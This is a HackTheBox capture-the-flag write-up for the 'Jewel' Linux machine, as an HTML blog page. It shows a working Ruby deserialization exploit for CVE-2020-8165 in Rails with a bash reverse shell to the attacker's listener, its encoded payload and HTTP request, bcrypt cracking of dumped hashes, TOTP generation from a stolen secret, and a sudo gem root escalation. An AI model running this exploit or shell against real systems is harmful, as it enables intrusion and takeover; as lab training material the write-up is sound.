<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Jewel | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Jewel HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/jewel/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/jewel/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Jewel "><meta property="og:description" content="Jewel HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/jewel/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/jewel/jewel.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-02-22T19:49:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/jewel/jewel.png"><meta name=twitter:title content="Jewel "><meta name=twitter:description content="Jewel HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Jewel ","item":"https://s4ch.github.io/writeups/hackthebox/jewel/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Jewel ","name":"Jewel ","description":"Jewel HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Jewel Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap oath-toolkit rlwrap pwncat gtfoblookup Network enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # Nmap 7.91 scan initiated Wed Feb 17 19:56:48 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.211 Nmap scan report for 10.10.10.211 Host is up (0.030s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA) | 256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA) |_ 256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519) 8000/tcp open http Apache httpd 2.4.38 |_http-generator: gitweb/2.20.1 git/2.20.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.38 (Debian) | http-title: 10.10.10.211 Git |_Requested resource was http://10.10.10.211:8000/gitweb/ 8080/tcp open http nginx 1.14.2 (Phusion Passenger 6.0.6) |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6 |_http-title: BL0G! Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 17 19:58:46 2021 -- 1 IP address (1 host up) scanned in 118.32 seconds We have gitweb/2.20.1 on port 8000 and Phusion Passenger 6.0.6 on port 8080.\nWeb discovery On gitweb we can browse to the summary of the only repository which is hosting the source code of the blog and download a snapshot of it.\n1 2 3 $ curl --output blog.tar.gz -J -L 'http://10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=5d6f436256c9575fbc7b1fb9621b18f0f8656741;sf=tgz' $ tar xaf blog.tar.gz $ cd .git-5d6f436 Source code analysis Let’s install a ruby and bundle version matching the one specified in the Gemfile:\n1 2 3 $ asdf install ruby 2.5.5 $ asdf local ruby 2.5.5 $ gem install bundler:1.17.3 It’s not mandatory to analyse the source code but it will allow use to run the website is we want to do some test or even the run bundle outdated to check for outdated dependencies.\nBefore we do that, we can see in config.ru that the blog is a RoR app (using Ruby on Rails web framework).\nLet’s see if the project is up to date:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 $ bundle outdated ... Outdated gems included in the bundle: * actioncable (newest 6.1.3, installed 5.2.2.1) * actionmailer (newest 6.1.3, installed 5.2.2.1) * actionpack (newest 6.1.3, installed 5.2.2.1) * actionview (newest 6.1.3, installed 5.2.2.1) * activejob (newest 6.1.3, installed 5.2.2.1) * activemodel (newest 6.1.3, installed 5.2.2.1) * activerecord (newest 6.1.3, installed 5.2.2.1) * activestorage (newest 6.1.3, installed 5.2.2.1) * activesupport (newest 6.1.3, installed 5.2.2.1) * autoprefixer-rails (newest 10.2.4.0, installed 9.8.6.3) * bcrypt (newest 3.1.16, installed 3.1.15, requested ~\u003e 3.1.7) in groups \"default\" * bootsnap (newest 1.7.2, installed 1.4.8) in groups \"default\" * bootstrap (newest 4.6.0, installed 4.5.2, requested ~\u003e 4.5.0) in groups \"default\" * capybara (newest 3.35.3, installed 3.33.0) in groups \"test\" * childprocess (newest 4.0.0, installed 3.0.0) * coffee-rails (newest 5.0.0, installed 4.2.2, requested ~\u003e 4.2) in groups \"default\" * concurrent-ruby (newest 1.1.8, installed 1.1.7) * erubi (newest 1.10.0, installed 1.9.0) * ffi (newest 1.14.2, installed 1.13.1) * i18n (newest 1.8.9, installed 1.8.5) * jbuilder (newest 2.11.2, installed 2.10.0, requested ~\u003e 2.5) in groups \"default\" * jquery-rails (newest 4.4.0, installed 4.3.3, requested = 4.3.3) in groups \"default\" * listen (newest 3.4.1, installed 3.1.5, requested \u003c 3.2, \u003e= 3.0.5) in groups \"development\" * loofah (newest 2.9.0, installed 2.6.0) * mini_portile2 (newest 2.5.0, installed 2.4.0) * minitest (newest 5.14.3, installed 5.14.1) * msgpack (newest 1.4.2, installed 1.3.3) * nio4r (newest 2.5.5, installed 2.5.2) * nokogiri (newest 1.11.1, installed 1.10.10) * popper_js (newest 2.6.0, installed 1.16.0, requested = 1.16.0) in groups \"default\" * public_suffix (newest 4.0.6, installed 4.0.5) * puma (newest 5.2.1, installed 3.12.6, requested ~\u003e 3.11) in groups \"default\" * rails (newest 6.1.3, installed 5.2.2.1, requested = 5.2.2.1) in groups \"default\" * railties (newest 6.1.3, installed 5.2.2.1) * rake (newest 13.0.3, installed 13.0.1) * redis (newest 4.2.5, installed 4.2.1, requested ~\u003e 4.0) in groups \"default\" * regexp_parser (newest 2.0.3, installed 1.7.1) * sass-rails (newest 6.0.0, installed 5.1.0, requested ~\u003e 5.0) in groups \"default\" * sprockets (newest 4.0.2, installed 3.7.2) * sprockets-rails (newest 3.2.2, installed 3.2.1) * thor (newest 1.1.0, installed 1.0.1) * tzinfo (newest 2.0.4, installed 1.2.7) * web-console (newest 4.1.0, installed 3.7.0) in groups \"development\" Seems that all dependencies are very outdated. We can install bundler-audit, which is an equivalent for Ruby to npm audit in Nodejs, to check for CVE impacting the dependencies.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 $ gem install bundler-audit $ bundle-audit Name: actionpack Version: 5.2.2.1 Advisory: CVE-2020-8166 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/NOjKiGeXUgw Title: Ability to forge per-form CSRF tokens given a global CSRF token Solution: upgrade to ~\u003e 5.2.4.3, \u003e= 6.0.3.1 Name: actionpack Version: 5.2.2.1 Advisory: CVE-2020-8164 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/f6ioe4sdpbY Title: Possible Strong Parameters Bypass in ActionPack Solution: upgrade to ~\u003e 5.2.4.3, \u003e= 6.0.3.1 Name: actionview Version: 5.2.2.1 Advisory: CVE-2020-5267 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/55reWMM_Pg8 Title: Possible XSS vulnerability in ActionView Solution: upgrade to \u003e= 5.2.4.2, ~\u003e 5.2.4, \u003e= 6.0.2.2 Name: actionview Version: 5.2.2.1 Advisory: CVE-2020-8167 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/x9DixQDG9a0 Title: CSRF Vulnerability in rails-ujs Solution: upgrade to ~\u003e 5.2.4.3, \u003e= 6.0.3.1 Name: activestorage Version: 5.2.2.1 Advisory: CVE-2020-8162 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/PjU3946mreQ Title: Circumvention of file size limits in ActiveStorage Solution: upgrade to ~\u003e 5.2.4.3, \u003e= 6.0.3.1 Name: activesupport Version: 5.2.2.1 Advisory: CVE-2020-8165 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c Title: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore Solution: upgrade to ~\u003e 5.2.4.3, \u003e= 6.0.3.1 Name: jquery-rails Version: 4.3.3 Advisory: CVE-2019-11358 Criticality: Medium URL: https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ Title: Prototype pollution attack through jQuery $.extend Solution: upgrade to \u003e= 4.3.4 Vulnerabilities found! The one one activesupport seems to be the most promising because unmarshalling is a kind of deserialization that can lead to RCE:\n1 2 3 4 5 6 7 Name: activesupport Version: 5.2.2.1 Advisory: CVE-2020-8165 Criticality: Unknown URL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c Title: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore Solution: upgrade to ~\u003e 5.2.4.3, \u003e= 6.0.3.1 A deserialization of untrusted data vulnernerability exists in rails \u003c 5.2.4.3, rails \u003c 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.\nRef. CVE-2020-8165\nWe sure have a vulnerable version of Rails:\n1 2 3 $ grep \"'rails'\" Gemfile # Bundle edge Rails instead: gem 'rails', github: 'rails/rails' gem 'rails', '= 5.2.2.1' The References section of CVE-2020-8165 page on NVD gives a link to a HackerOne report tagged as exploit in addition to the many mailing list.\nBy reading the H1 report, we can read:\nThis vulnerability effects application code that caches a string from an untrusted source using the raw: true option.\nSo let’s find if the option is used in the code:\n1 2 3 $ grep -rn 'raw: true' app app/controllers/application_controller.rb:32: @current_username = cache.fetch(\"username_#{session[:user_id]}\", raw: true) do app/controllers/users_controller.rb:37: @current_username = cache.fetch(\"username_#{session[:user_id]}\", raw: true) {user_params[:username]} app/controllers/users_controller.rb L32-L49\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def update @user = User.find(params[:id]) if @user \u0026\u0026 @user == current_user cache = ActiveSupport::Cache::RedisCacheStore.new(url: \"redis://127.0.0.1:6379/0\") cache.delete(\"username_#{session[:user_id]}\") @current_username = cache.fetch(\"username_#{session[:user_id]}\", raw: true) {user_params[:username]} if @user.update(user_params) flash[:success] = \"Your account was updated successfully\" redirect_to articles_path else cache.delete(\"username_#{session[:user_id]}\") render 'edit' end else flash[:danger] = \"Not authorized\" redirect_to articles_path end end The update method will cache a key username_ using user_params[:username] which is user supplied and so untrusted. It will cache the value and then try to update the database but if it fails it will remove the cached value.\napp/controllers/application_controller.rb L29-L40\n1 2 3 4 5 6 7 8 9 10 11 12 def current_username if session[:user_id] cache = ActiveSupport::Cache::RedisCacheStore.new(url: \"redis://127.0.0.1:6379/0\") @current_username = cache.fetch(\"username_#{session[:user_id]}\", raw: true) do @current_user = current_user @current_username = @current_user.username end else @current_username = \"guest\" end return @current_username end The key is also fetched with current_username method.\nLet’s see what is the format of an username to know if we can poison it.\n1 2 3 4 5 6 7 8 $ grep -rn ':username' app app/views/users/_form.html.erb:7: \u003c%= f.label :username %\u003e app/views/users/_form.html.erb:8: \u003c%= f.text_field :username, class: \"form-control\", placeholder: \"Username\", autofocus: true %\u003e app/views/users/edit.html.erb:10: \u003c%= f.label :username %\u003e app/views/users/edit.html.erb:11: \u003c%= f.text_field :username, class: \"form-control\", placeholder: \"Username\", autofocus: true %\u003e app/controllers/users_controller.rb:37: @current_username = cache.fetch(\"username_#{session[:user_id]}\", raw: true) {user_params[:username]} app/controllers/users_controller.rb:53: params.require(:user).permit(:username, :email, :password) app/models/user.rb:6: validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 }, The user class must be defined in app/models/user.rb.\napp/models/user.rb L1-L11\n1 2 3 4 5 6 7 8 9 10 11 class User \u003c ActiveRecord::Base has_many :articles has_secure_password VALID_USER_REGEX = /\\A[\\w\\d]+\\z/ VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-.]+\\.[a-z]+\\z/i validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 }, format: { with: VALID_USER_REGEX } validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false }, format: { with: VALID_EMAIL_REGEX } before_save { self.email = email.downcase } end So the username must contains only alphanumeric characters and be 3 to 25 chars long. At first glance it looks impossible to poison the username with a malicious payload to corrupt the cache. But a more in depth analysis shows that we will be able to perform our deserialization to RCE.\nLooking back at app/controllers/users_controller.rb the username is written into the cache without any control (what we just saw in app/models/user.rb are constraints on the database not the cache), then it will update the database but fails because there username format won’t we respected and so it will trigger the cache deletion. But the deletion won’t work because as the payload will be evaluated it will crash the app (500 error) so the cached value will stay stored and be retrieved on a subsequent fetch request.\nWeb exploitation Since it’s an authenticated vulnerability (yes to update your username you need an account), let’s register one on the blog (http://10.10.10.211:8080/signup).\nWe can edit the username at this address http://10.10.10.211:8080/users/19/edit but before that we’ll need to craft a payload.\nLet’s retrieve the PoC from the H1 report and modify it a little bit to include a reverse shell and url-encode the payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 require 'erb' require 'rails/all' require 'uri' remote_code = \u003c\u003c-RUBY `/bin/bash -c \"bash -i \u0026\u003e/dev/tcp/10.10.14.125/9999 0\u003e\u00261\"` RUBY erb = ERB.allocate erb.instance_variable_set(:@src, remote_code) erb.instance_variable_set(:@lineno, 0) deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result) exploit_data = Marshal.dump(deprecation) puts URI.encode_www_form(username: exploit_data) Lets’ build the payload:\n1 2 $ bundle exec ruby exploit.rb username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T Intercept traffic with Burp and replace the username with the payload.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /users/19 HTTP/1.1 Host: 10.10.10.211:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.211:8080/users/19/edit Content-Type: application/x-www-form-urlencoded Content-Length: 584 Origin: http://10.10.10.211:8080 Connection: close Cookie: _session_id=39429a031ee66edae6af06579185eb80 Upgrade-Insecure-Requests: 1 utf8=%E2%9C%93\u0026_method=patch\u0026authenticity_token=tlufjzm%2FbY9fBxS%2Bu1QqkY%2BoaSXn3cEL40I1tGF6g4lYvmhcsv8i5NKjpDuOnn6vOABZIzmfLrWS%2Fy7vjgEAsQ%3D%3D\u0026user%5Busername%5D=username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T\u0026commit=Update+User We retrieve the shell on our listener:\n1 2 3 4 5 6 7 8 9 10 11 $ rlwrap pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.211:51176 (family 2/IPv4, TCP) bash: cannot set terminal process group (811): Inappropriate ioctl for device bash: no job control in this shell bill@jewel:~/blog$ id uid=1000(bill) gid=1000(bill) groups=1000(bill) bill@jewel:~$ cat user.txt 02d71a6b8858cc2812ee368bc1ab355b Privilege Escalation of Machine : from bill to root Let’s get an interactive shell:\n1 bill@jewel:~$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' We can’t use sudo -l because we don’t know bill’s password.\nLet’s find backup or config files in hope to discover passwords:\n1 2 3 4 5 6 7 8 bill@jewel:~$ find / -name *.sql -type f 2\u003e/dev/null /var/backups/dump_2020-08-27.sql /usr/share/postgresql/11/extension/citext--1.4--1.5.sql ... bill@jewel:~$ grep -n password /var/backups/dump_2020-08-27.sql 132: password_digest character varying 229:COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin; Let’s dig around line 229:\n1 2 3 4 5 6 7 8 -- -- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: rails_dev -- COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin; 2 jennifer jennifer@mail.htb 2020-08-27 05:44:28.551735 2020-08-27 05:44:28.551735 $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO 1 bill bill@mail.htb 2020-08-26 10:24:03.878232 2020-08-27 09:18:11.636483 $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW \\. Let’s ask my old pall John if he knows them:\n1 2 jennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO bill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW 1 $ john hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt I found bill’s password but not jennifer one.\nbill / spongebob\nTrying sudo again we are asked for a verification code, it reminds me when I set up OTP with libpam-google-authenticator for a SSH server.\nWe can find bill’s OTP private key in his home directory:\n1 2 3 4 bill@jewel:~$ cat .google_authenticator 2UQI3R52WFCLE6JTLDCSJYMJH4 \" WINDOW_SIZE 17 \" TOTP_AUTH I was able to generate a one time password with oath-toolkit:\n1 2 $ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4 297774 But I kept having this error while trying to auth:\n1 Error \"Operation not permitted\" while writing config TOTP is time based and I’m not in the same timezone than the box:\n1 2 3 4 # box Sun 21 Feb 20:45:21 GMT 2021 # my machine Sun Feb 21 09:35:41 PM CET 2021 Let’s print the box time in RFC format:\n1 2 $ date --rfc-3339=seconds 2021-02-21 20:50:55+00:00 So I tried to create the OTP code like that but it kept failing:\n1 2 $ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4 -S '2021-02-21 20:54:31+00:00' 626503 Let’s try another method: setting teh same time on our machine. The box timezone:\n1 2 3 4 5 6 7 8 $ timedatectl Local time: Sun 2021-02-21 21:08:22 GMT Universal time: Sun 2021-02-21 21:08:22 UTC RTC time: Sun 2021-02-21 21:08:21 Time zone: Europe/London (GMT, +0000) System clock synchronized: no NTP service: active RTC in local TZ: no Set up the time on my machine:\n1 2 3 $ sudo timedatectl set-timezone Europe/London $ sudo timedatectl set-ntp false $ sudo timedatectl set-time 21:15:07 Finaly I can run it:\n1 2 3 4 5 6 7 8 9 $ sudo -l Matching Defaults entries for bill on jewel: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, insults User bill may run the following commands on jewel: (ALL : ALL) /usr/bin/gem PS: it’s not an issue if there is a desync of a few seconds because the OTP window is 17 codes so we can have a max desync of 17 x 30 sec.\nLet’s see the pe for gem:\n1 2 3 4 5 6 7 8 $ gtfoblookup linux sudo gem gem: sudo: Description: This requires the name of an installed gem to be provided (`rdoc` is usually installed). Code: sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc My paylmaod will be\n1 sudo /usr/bin/gem open -e \"/bin/sh -c /bin/bash\" bundler Let’s get root:\n1 2 3 4 5 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 96a8f2a385ce2c384353e6998dc3fdac ","wordCount":"2544","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/jewel/jewel.png","datePublished":"2021-02-22T19:49:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/jewel/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Jewel</h1><div class=post-description>Jewel HackTheBox writeup</div><div class=post-meta><span title='2021-02-22 19:49:00 +0000 UTC'>February 22, 2021</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2544 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/jewel/jewel.png alt="Jewel HackTheBox Machine"><p>Jewel - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-discovery>Web discovery</a></li><li><a href=#source-code-analysis>Source code analysis</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#privilege-escalation-of-machine--from-bill-to-root>Privilege Escalation of Machine : from bill to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Jewel</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/282>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>nmap</span> <span class=n>oath</span><span class=o>-</span><span class=n>toolkit</span> <span class=n>rlwrap</span> <span class=n>pwncat</span> <span class=n>gtfoblookup</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl># Nmap 7.91 scan initiated Wed Feb 17 19:56:48 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.211
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.211
</span></span><span class=line><span class=cl>Host is up (0.030s latency).
</span></span><span class=line><span class=cl>Not shown: 65532 filtered ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
